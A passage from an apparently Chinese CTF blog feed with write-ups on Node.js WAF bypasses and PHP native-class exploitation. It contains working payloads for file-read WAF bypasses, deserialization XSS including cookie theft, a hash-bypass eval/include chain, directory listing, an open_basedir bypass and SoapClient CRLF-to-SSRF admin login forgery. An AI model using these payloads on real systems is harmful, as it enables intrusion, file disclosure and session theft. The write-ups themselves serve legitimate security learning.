行及以下的代码片段执行读取文件过程，无需深入研究。我们需要深入研究的要点是第 467 行的代码。通过研究fs.openSync函数来跟踪代码。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788506-b6f91f83-3bd6-43ed-ab40-d21fb43b860d.png" alt="image.png"><br>通过调查getValidatedPath功能继续关注。</p><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788081-009143b9-094b-470d-b9c8-36f6f3ec9a1c.png" alt="image.png"><br>按住不放，这里会出现一些有趣的东西。因此，如果该fileURLOrPath值不为 null，并且其中有 existshref和origin，它将调用 to fileURLToPath，将fileURLOrPath值转换为 URL。这就是我想说的！我能感觉到我走的路是对的！<br>获得动力，我继续研究这个fileURLToPath功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935794727-c8ad1160-3801-48c0-b0d0-625d21dc379a.png" alt="image.png"><br>该值的一个附加条件fileURLOrPath是其协议必须是file:. 全部检查通过后，会调用相应的函数从URL中获取路径。由于我在 Linux 上调试，所以我继续研究该getPathFromURLPosix功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935795561-c49c1cd2-acc0-46b6-85c4-db4ded4c9806.png" alt="image.png"><br>再次检查此代码片段：hostname必须为空。但是，这里需要注意一件值得注意的事情，它将帮助我们绕过 simplewaf 的includes检查，那就是它将对<strong>simplewaf</strong>pathname执行 URL 解码以获取 URL。这意味着如果我们pathname从 Web 应用程序传递一个双 URL 编码值，它最终将文件路径变成纯文本。你猜怎么着？由于客户端传递给includes检查的值只是 URL 解码一次，我们也可以轻松绕过此检查。<br>好的，让我们总结一下将有效参数file作为 URL传递给函数readFileSync需要做的所有事情。</p><ul><li>file不为空</li><li>file.origin存在</li><li>file.href存在</li><li>file.protocol = ‘file:’</li><li>file.hostname = ‘’</li></ul><p>绕过waf并获得标志的最终要求是：</p><ul><li>file.pathname是双重 URL 编码</li></ul><p><strong>解决方案</strong><br>根据上面的分析，我构造了如下的payload：<br>file[origin]=x&amp;file[href]=x&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=fla%2567.txt<br>我只是对字符进行双重 URL 编码g以绕过 waf。使用有效载荷，我们成功获得了测试标志。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935796021-c337cfb2-2659-429c-aa5d-94fee9e55d4d.png" alt="image.png"><br>好吧，先拿真旗吧~<br>corctf{hmm_th4t_waf_w4snt_s0_s1mple}</p><h2 id="祥云杯2022-RUSTwaf"><a href="#祥云杯2022-RUSTwaf" class="headerlink" title="祥云杯2022 RUSTwaf"></a>祥云杯2022 RUSTwaf</h2><pre><code class="javascript">const express = require(&#39;express&#39;);const app = express();const bodyParser = require(&quot;body-parser&quot;)const fs = require(&quot;fs&quot;)app.use(bodyParser.text(&#123;type: &#39;*/*&#39;&#125;));const &#123;  execFileSync &#125; = require(&#39;child_process&#39;);app.post(&#39;/readfile&#39;, function (req, res) &#123;    let body = req.body.toString();    let file_to_read = &quot;app.js&quot;;    const file = execFileSync(&#39;/app/rust-waf&#39;, [body], &#123;        encoding: &#39;utf-8&#39;    &#125;).trim();    try &#123;        file_to_read = JSON.parse(file)    &#125; catch (e)&#123;        file_to_read = file    &#125;    let data = fs.readFileSync(file_to_read);    res.send(data.toString());&#125;);app.get(&#39;/&#39;, function (req, res) &#123;    res.send(&#39;see `/src`&#39;);&#125;);app.get(&#39;/src&#39;, function (req, res) &#123;    var data = fs.readFileSync(&#39;app.js&#39;);    res.send(data.toString());&#125;);app.listen(3000, function () &#123;    console.log(&#39;start listening on port 3000&#39;);&#125;);</code></pre><p>直接/readfile读源码</p><pre><code class="javascript">use std::env;use serde::&#123;Deserialize, Serialize&#125;;use serde_json::Value;static BLACK_PROPERTY: &amp;str = &quot;protocol&quot;;#[derive(Debug, Serialize, Deserialize)]struct File&#123;    #[serde(default = &quot;default_protocol&quot;)]    pub protocol: String,    pub href: String,    pub origin: String,    pub pathname: String,    pub hostname:String&#125;pub fn default_protocol() -&gt; String &#123;    &quot;http&quot;.to_string()&#125;//protocol is default value,can&#39;t be customizedpub fn waf(body: &amp;str) -&gt; String &#123;    if body.to_lowercase().contains(&quot;flag&quot;) ||  body.to_lowercase().contains(&quot;proc&quot;)&#123;        return String::from(&quot;./main.rs&quot;); //这里限制我们不能带有flag和proc字段    &#125;    if let Ok(json_body) = serde_json::from_str::&lt;Value&gt;(body) &#123;        if let Some(json_body_obj) = json_body.as_object() &#123;            if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) &#123;                return String::from(&quot;./main.rs&quot;);    //这里限制我们的json字段不能带有protocol字段，但是下面限制我们是file结构体，这也就意味着我们一定要有protocol字段            &#125;        &#125;        //not contains protocol,check if struct is File        if let Ok(file) = serde_json::from_str::&lt;File&gt;(body) &#123;//限制我们只能是这个结构体            return serde_json::to_string(&amp;file).unwrap_or(String::from(&quot;./main.rs&quot;));        &#125;    &#125; else&#123;        //body not json        return String::from(body);    &#125;    return String::from(&quot;./main.rs&quot;);&#125;fn main() &#123;    let args: Vec&lt;String&gt; = env::args().collect();    println!(&quot;&#123;&#125;&quot;, waf(&amp;args[1]));  //这里把json的第二字段传进去&#125;</code></pre><p>将payload以json格式传，但是这里用到的payload中存在protocol导致rust能检测到，要利用unicode 绕过<br>最终payload：</p><pre><code class="javascript">&#123;&quot;hostname&quot;:&quot;&quot;,&quot;pathname&quot;:&quot;/fl%61g&quot;,&quot;protocol&quot;:&quot;file:&quot;,&quot;origin&quot;:&quot;fuckyou&quot;,&quot;pr\ud800otocol&quot;:&quot;file:&quot;,&quot;href&quot;:&quot;fuckyou&quot;&#125;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/shawdow_bug/article/details/120072209">https://blog.csdn.net/shawdow_bug/article/details/120072209</a><br><a href="https://xz.aliyun.com/t/11791#toc-8">https://xz.aliyun.com/t/11791#toc-8</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Nodejs语言特性&quot;&gt;&lt;a href=&quot;#Nodejs语言特性&quot; class=&quot;headerlink&quot; title=&quot;Nodejs语言特性&quot;&gt;&lt;/a&gt;Nodejs语言特性&lt;/h1&gt;&lt;h2 id=&quot;大小写特性&quot;&gt;&lt;a href=&quot;#大小写特性&quot; class=&quot;he</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="node_js" scheme="https://sakurahack-y.github.io/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>php原生类学习</title>
    <link href="https://sakurahack-y.github.io/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sakurahack-y.github.io/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-11-20T03:27:20.000Z</published>
    <updated>2022-11-19T17:57:35.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="查看各方法内置类"><a href="#查看各方法内置类" class="headerlink" title="查看各方法内置类"></a>查看各方法内置类</h1><p> 通过这段代码查看方法的类，这里看到__toString方法对应的Error类  </p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;__destruct&#39;,            &#39;__toString&#39;,            &#39;__wakeup&#39;,            &#39;__call&#39;,            &#39;__callStatic&#39;,            &#39;__get&#39;,            &#39;__set&#39;,            &#39;__isset&#39;,            &#39;__unset&#39;,            &#39;__invoke&#39;,            &#39;__set_state&#39;    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664897701461-e3b768b2-f079-4361-acd3-5955b55ff9e8.png" alt="image.png"></p><h1 id="利用Error-Exception内置类进行XSS"><a href="#利用Error-Exception内置类进行XSS" class="headerlink" title="利用Error/Exception内置类进行XSS"></a>利用Error/Exception内置类进行XSS</h1><h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><p>利用条件:<br>php7以上<br>开启报错情况下<br> Error类是php的一个常见类，用于自定义一个Error，当用户输入错误的值，回显Error页面，php7版本会存在类似的XSS漏洞。Error::__toString，Error类存在__toString的方法，该方法进行类当作字符串进行回应，也就是echo $l3ife会显示什么。php对象当作一个字符串输出（echo $l3ife）会触发to_String方法。一般用于反序列化漏洞和XSS漏洞。<br> 本地创建error.php(php版本设置为7.0)  </p><pre><code class="php">&lt;?phphighlight_file(&#39;2.php&#39;);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt; </code></pre><p> 这段反序列化函数，并不存在自定义类，不可以打反序列化，可以用php反序列化的php内置类<br>poc:</p><pre><code class="php">&lt;?php    $a=new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898216896-e958dd71-080f-4d98-a8be-e70d8af6f2e2-16688788988219.png" alt="image.png"></p><h2 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h2><p>利用条件:<br>php5、php7<br>开启报错的情况下</p><pre><code class="php">&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt;</code></pre><p>poc:</p><pre><code class="php">&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898394442-c162fce3-1be4-4c2f-8ad0-7e17fc82993f.png" alt="image.png"></p><h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a><strong>[BJDCTF 2nd]xss之光</strong></h2><p> 通过git拿到源码  </p><pre><code class="php">&lt;?php $a = $_GET[&#39;yds_is_so_beautiful&#39;];Echo unserialize($a);</code></pre><p> 给了GET传参，进行反序列化，不知道怎么自定义类，遇到了反序列化没有POP链的情况。只能通过php内置类进行反序列化，又存在echo，可以用__toString方法返回对象进行反序列化。该题为XSS之光，所以可以通过XSS拿出FLAG。<br> 思路：flag一般在COOKIE的信息里。<br>poc:</p><pre><code class="php">&lt;?php$poc=new    Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);Echo urlencode(serialize($poc));?&gt;反弹cookie</code></pre><p> 将得到的结果传入<br>/?yds_is_so_beautiful=$POC  </p><h1 id="利用Error-Exception-内置类绕过哈希比较"><a href="#利用Error-Exception-内置类绕过哈希比较" class="headerlink" title="利用Error/Exception 内置类绕过哈希比较"></a>利用Error/Exception 内置类绕过哈希比较</h1><p> 测试代码  :</p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);echo $a;</code></pre><p> 发现会以字符串进行输出，包括当前的错误信息payload以及报错的行号2，传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来。  </p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);echo $a;echo &quot;\r\n\r\n&quot;;echo $b;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898879803-a51766b8-316d-464b-83a4-2f80e33e69a3.png" alt="image.png"><br> $a 和 $b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。<br>可以利用这个方法果然哈希比较。  </p><h2 id="2020-极客大挑战-Greatphp"><a href="#2020-极客大挑战-Greatphp" class="headerlink" title="[2020 极客大挑战]Greatphp"></a><strong>[2020 极客大挑战]Greatphp</strong></h2><p> 考点：php内置绕过哈希比较、php取反绕过  </p><pre><code class="php">&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if(($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#39;/&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;if (isset($_GET[&#39;great&#39;]))&#123;    unserialize($_GET[&#39;great&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p> 要是常见的php题目，可以数组绕过强类型。在这题目中，需要Error类。<br>主要是绕过这个</p><pre><code class="php">if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)))</code></pre><p> md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。<br>我们先来测试一下:<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665202986018-e4a18f5f-99ca-4689-96f4-aba268382f66.png" alt="img"><br>注意两个Error要在同一行哦，否则他们报错的输出有行数的不同！<br>payload:</p><pre><code class="php">&lt;?phpclass SYCLOVER &#123;    public $syc;    public $lover;&#125;//$cmd = &quot;flag.php&quot;;//$str = urlencode(~$cmd);  %99%93%9E%98%D1%8F%97%8F$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;//print $str;echo &quot;\r\n\r\n&quot;;$c = new SYCLOVER();$c-&gt;syc = new Error($str,1);$c-&gt;lover=new Error($str,2);echo urlencode(serialize($c));?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212087693-85115409-6be8-4971-9941-dda917bee1d0.png" alt="img"><br>这里其实有一个地方要注意:</p><pre><code class="php">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;</code></pre><p>为什么最前面要加上?&gt;呢<br>我们还记得Error类返回什么吗?<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212238513-51947da1-c5af-4d50-bc72-e700f1a297b9.png" alt="img"><br>Error是无法直接返回我们所需要的paylaod的，它前面有Error:影响，我们可以用&gt;?去闭合它<br>最终我们的语句就变为:</p><pre><code class="php">eval(&quot;Error:?&gt;&lt;?=include &#39;flag.php&#39;?&gt;xxxxxxx&quot;)</code></pre><p>这样实际上是不影响语句的执行</p><h1 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a>可遍历目录类</h1><h2 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h2><pre><code class="php">版本：php5、php7、php8Filesystemlterator版本：PHP 5 &gt;= 5.3.0, PHP 7, PHP 8</code></pre><pre><code class="php">&lt;?php highlight_file(__file__); $dir=$_GET[&#39;cmd&#39;]; $a=new DirectoryIterator($dir); foreach($a as $f)&#123;     echo($f -&gt; __toString().&quot;&lt;br&gt;&quot;);      &#125; ?&gt; </code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665216764271-1ae96322-73a5-4f13-a57c-9107ab60b212.png" alt="img"><br> 查看该类，发现__toString()方法<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217135566-8285ea34-f95a-4dba-a8c0-0f866120c9f4.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217175171-fec85446-9c96-432a-99df-28d5635fa417.png" alt="img"><br> 会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的toString() 方法，输出指定目录里面经过排序之后的第一个文件名 配合glob://协议使用模式匹配来寻找我们想要的文件路径 </p><h2 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h2><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。<br>该类的使用方法与DirectoryIterator 类也是基本相同的：(子类与父类的关系)</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218139607-9e586dc8-c57f-411b-a0d7-e17dc51fac18.png" alt="img"><br>遍历一下</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;foreach($dir as $tmp)&#123;    echo($tmp.&#39;&lt;br&gt;&#39;);    echo &quot;\n&quot;;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218128602-a7225ff2-4bc6-4903-9fad-3fac2139d6f7.png" alt="img"></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p> SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218238132-374592ac-faae-4784-b50a-798f1e5fc2fa.png" alt="img"></p><pre><code class="php">    &lt;?php    $dir=new SplFileObject(&quot;flag.php&quot;);    echo $dir;    ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218317940-59dff161-d172-4b69-9e72-ce88967e8562.png" alt="img"><br> 对文件中的每一行内容进行遍历：  </p><pre><code class="php">&lt;?php$dir = new SplFileObject(&quot;flag.php&quot;);foreach($dir as $tmp)&#123;    echo ($tmp.&#39;&lt;br&gt;&#39;);&#125;?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218391694-fb13c795-3987-47a3-8a36-165697809110.png" alt="img"><br>出题的时候如果看到形如:</p><pre><code class="php">    echo new $this-&gt;key($this-&gt;value);      $this -&gt; a = new $this-&gt;key($this-&gt;value);    echo $this-&gt;a;</code></pre><p> 只需要让**$this-&gt;key<strong>值赋为我们想用原生函数，</strong>$this-&gt;value**赋为路径，查就行了。但是这种构造类型的方法的局限性就是只能查一个路径上的一个文件。  </p><pre><code class="php">&lt;?phpclass HY&#123;    public $a;    public $b;&#125;$c = new HY();$c-&gt;a=&quot;SplFileObject&quot;;$c-&gt;b=&quot;flag.php&quot;;echo new $c-&gt;a($c-&gt;b);?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218812533-da081255-65fe-494e-b0e4-ae13eb6c2b7d.png" alt="img"></p><h1 id="突破open-basedir的限制"><a href="#突破open-basedir的限制" class="headerlink" title="突破open_basedir的限制"></a>突破open_basedir的限制</h1><p> ctfshow web74  </p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;, 0); // 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;    $c=$_POST[&#39;c&#39;];    eval($c);    $s=ob_get_contents();    ob_end_clean();    echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__); &#125; ?&gt;?&gt;</code></pre><p>首先介绍一下ob_get_contents()和ob_end_clean这两个函数。<br>缓冲区(Buffer)就是在内存中预留指定大小的存储空间用来对I/O的数据做临时存储，这部分预留的内存空间叫缓冲区。也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。<br>缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区和输出缓冲区。<br>ob_get_contents:返回输出缓冲区的内容，只是得到缓冲区的内容，但不清除它。<br>ob_end_clean:清空（擦除）缓冲区并关闭输出缓冲。<br>eval执行我们的命令后，输出flag内容，但是输出要经过缓冲区，对输出数据进行缓存，通过ob_get_contents() 原来的数据赋值给了$s，然后又用ob_end_clean将缓冲区清空了，那么eval就没办法输出了（缓冲区都被清空了），所以就只有$s一个输出了。所以这里可以通过exit()或者die() （exit别名）退出，这样的话就没有ob_end_clean这个缓冲区清空操作，输出就能正常输出。<br><strong>构造payload:</strong></p><pre><code class="php">c=?&gt;&lt;?php$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);?&gt;</code></pre><p>然后读取文件</p><pre><code class="php">&gt;c=include(&#39;/flagx.txt&#39;);exit();</code></pre><h1 id="利用SoapClient类进行CRLF-SSRF"><a href="#利用SoapClient类进行CRLF-SSRF" class="headerlink" title="利用SoapClient类进行CRLF+SSRF"></a>利用SoapClient类进行CRLF+SSRF</h1><p> soapClient：专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。<br>类介绍：  </p><pre><code class="php">SoapClient &#123;    /* 方法 */    public __construct ( string|null $wsdl , array $options = [] )    public __call ( string $name , array $args ) : mixed    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null    public __getCookies ( ) : array    public __getFunctions ( ) : array|null    public __getLastRequest ( ) : string|null    public __getLastRequestHeaders ( ) : string|null    public __getLastResponse ( ) : string|null    public __getLastResponseHeaders ( ) : string|null    public __getTypes ( ) : array|null    public __setCookie ( string $name , string|null $value = null ) : void    public __setLocation ( string $location = &quot;&quot; ) : string|null    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125;</code></pre><p> 存在_ _call方法，当__call方法被触发，可以发送HTTP和HTTPS请求。使得 SoapClient 类可以被我们运用在 SSRF 中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。  </p><pre><code class="php">函数形式：    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])第一个参数为指明是否为wsdl模式，为null则为非wsdl模式wsdl，就是一个xml格式的文档，用于描述Web Server的定义第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置location和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间</code></pre><p> 首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://108.166.201.16:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png" alt="img"></p><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p> 从上图可以看到，SOAPAction处可控，可以把\x0d\x0a注入到SOAPAction，POST请求的header就可以被控制  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p>第一个参数是用来指明是否是 wsdl 模式。<br>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。具体可以设置的参数可见官方文档<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png" alt="img"></p><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png" alt="img"></p><p>但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据<br>在header里User-Agent在Content-Type前面</p><pre><code class="php">https://www.php.net/manual/zh/soapclient.soapclient.php :The user_agent option specifies string to use in User-Agent header.</code></pre><p>user_agent同样可以注入CRLF，控制Content-Type的值</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1:5555/path&#39;;$post_string = &#39;data=something&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=my_session&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png" alt="img"></p><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299243252-81156156-b050-4637-bea8-54bd0d302863-166888019827967.png" alt="img"></p><p>如上，使用SoapClient<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>+CRLF<strong>可以生成任意POST请求</strong>。<br><strong>Deserialization + __call + SoapClient + CRLF = SSRF</strong></p><h2 id="N1CTF-2018-easy-harder-php"><a href="#N1CTF-2018-easy-harder-php" class="headerlink" title="[N1CTF 2018]easy_harder_php"></a><a href="http://www.baidu.com/link?url=oGo5steYSGhrbjjf_RBqktmzUnvWTpUIj4QV7riBUNNxIkL67bsln8HTZAfs1lSXeqgf39HGtT9BCjt2N1fTb6v4mJacdeZcQvE8whLwuvm&wd=&eqid=f4d6d11600082915000000056342763d">[N1CTF 2018]easy_harder_php</a></h2><p><a href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a><br>(我这里想复现一下，感觉code那里有问题，无法进行注册和登录操作)<br>拿到admin密码之后，需要从127.0.0.1登陆，用到SSRF，通过注入a`, {serialize object});#引发反序列化漏洞<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665328994027-84c31d48-8cd3-4d0d-b1cd-b093727e4019.png" alt="img"><br>反序列化后的SoapClient对象去调用不存在的getcountry方法，调用__call，实现SSRF<br>控制PHPSESSID为自己的session，SSRF来进行admin登陆</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1/index.php?action=login&#39;;$post_string = &#39;username=admin&amp;password=nu1ladmin&amp;code=cf44f3147ab331af7d66943d888c86f9&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo bin2hex($aaa);?&gt;</code></pre><p> 再使用上面的PHPSESSID访问，就是admin了  </p><h2 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h2><p><img 